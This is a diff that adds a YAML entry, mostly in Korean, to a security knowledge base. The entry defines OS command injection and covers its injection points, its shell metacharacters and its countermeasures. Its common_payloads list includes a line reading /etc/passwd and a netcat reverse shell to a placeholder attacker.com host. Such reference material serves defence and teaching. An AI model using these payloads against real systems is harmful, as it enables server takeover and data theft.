@@ -1,0 +1,149 @@
+# GR Atom: Command Injection Attack
+# Version: 1.0
+# Created: 2025-01-29
+
+identity:
+  id: "ATK-INJECT-CMD-001"
+  name: "OS Command Injection"
+  normalization:
+    normalized_name: "command injection os command injection shell injection"
+    normalization_version: "1.0"
+  aliases:
+    - "Command Injection"
+    - "명령어 삽입"
+    - "Shell Injection"
+    - "OS Injection"
+
+classification:
+  domain: security
+  type: technique
+  abstraction_level: 3
+  gr_coordinates:
+    layer: "L3"  # OS 레벨
+    zone: "Zone2"
+    tags: ["INJ", "EXPLOIT"]
+
+definition:
+  what: |
+    Command Injection은 사용자 입력이 운영체제 명령어에 삽입되어
+    공격자가 임의의 시스템 명령을 실행하는 취약점이다.
+    서버 완전 장악, 데이터 탈취, 백도어 설치가 가능하다.
+  why: |
+    SQL Injection보다 더 치명적일 수 있다. 데이터베이스 뿐 아니라
+    전체 서버 시스템을 장악할 수 있으며, 내부 네트워크 침투의
+    발판이 된다.
+  how: |
+    1. 공격자가 입력 필드에 셸 메타문자 삽입 (; | && 등)
+    2. 애플리케이션이 입력을 OS 명령어에 결합
+    3. 셸이 조작된 명령어 실행
+    4. 공격자 명령이 서버에서 실행됨
+
+relations:
+  structural:
+    is_a: ["GR-SEC-CON-00001"]  # Injection의 하위 개념
+  causal:
+    causes:
+      - "ATK-POST-BACKDOOR-001"   # 백도어 설치
+    enables:
+      - "ATK-POST-LATERAL-001"   # 내부 이동
+  conditional:
+    requires:
+      - "TECH-CONCEPT-SHELL-001"  # 셸 지식
+  applicability:
+    applies_to:
+      - "INFRA-APP-WEBAPP-001"
+      - "INFRA-APP-API-001"
+
+properties:
+  technical:
+    injection_points:
+      - "파일명 처리 (업로드, 다운로드)"
+      - "시스템 유틸리티 호출 (ping, nslookup)"
+      - "이미지/문서 변환"
+      - "PDF 생성"
+      - "백업/로그 처리"
+    shell_metacharacters:
+      command_separators:
+        - char: ";"
+          description: "명령어 순차 실행"
+        - char: "|"
+          description: "파이프 (앞 명령 출력을 뒤 명령 입력으로)"
+        - char: "||"
+          description: "앞 명령 실패 시 뒤 명령 실행"
+        - char: "&&"
+          description: "앞 명령 성공 시 뒤 명령 실행"
+        - char: "&"
+          description: "백그라운드 실행"
+        - char: "\\n"
+          description: "줄바꿈 (새 명령)"
+      command_substitution:
+        - "`command`"
+        - "$(command)"
+    common_payloads:
+      linux:
+        - "; id"
+        - "| cat /etc/passwd"
+        - "$(whoami)"
+        - "`uname -a`"
+        - "; nc -e /bin/sh attacker.com 4444"
+      windows:
+        - "& dir"
+        - "| type C:\\Windows\\win.ini"
+        - "& whoami"
+  security:
+    impact:
+      confidentiality: "CRITICAL - 전체 시스템 접근"
+      integrity: "CRITICAL - 시스템 변조"
+      availability: "CRITICAL - 시스템 파괴 가능"
+    cvss_base: 9.8
+    mitre_attack:
+      technique_id: "T1059"
+      tactic: "Execution"
+    cwe_id: "CWE-78"
+    owasp: "A03:2021 - Injection"
+  countermeasures:
+    primary:
+      - name: "시스템 명령 호출 회피"
+        description: "가능하면 라이브러리/API 사용"
+        effectiveness: "HIGH"
+      - id: "DEF-PREVENT-INPUTVAL-001"
+        name: "화이트리스트 입력 검증"
+        effectiveness: "HIGH"
+    secondary:
+      - name: "최소 권한 실행"
+        description: "애플리케이션을 제한된 권한으로 실행"
+        effectiveness: "MEDIUM"
+
+metadata:
+  trust:
+    source: official
+    references:
+      - "OWASP Command Injection"
+      - "CWE-78"
+    confidence: 1.0
+    verified:
+      status: verified
+      date: 2025-01-29
+      by: "GR System"
+  temporal:
+    created: 2025-01-29
+    modified: 2025-01-29
+    revision: 1
+  security:
+    sensitivity: public
+    weaponization_risk: high
+  ai:
+    embedding_text: |
+      Command Injection은 사용자 입력이 OS 명령어에 삽입되어 임의 명령을
+      실행하는 취약점이다. 세미콜론(;), 파이프(|), 백틱(`) 등 셸 메타문자를
+      사용한다. 서버 완전 장악이 가능하여 SQL Injection보다 치명적이다.
+      시스템 명령 호출 회피, 화이트리스트 검증으로 방어한다.
+    search_keywords:
+      - "Command Injection"
+      - "명령어 삽입"
+      - "OS Injection"
+      - "Shell Injection"
+    related_queries:
+      - "Command Injection이란?"
+      - "명령어 삽입 공격 방법"
+      - "Command Injection vs SQL Injection"
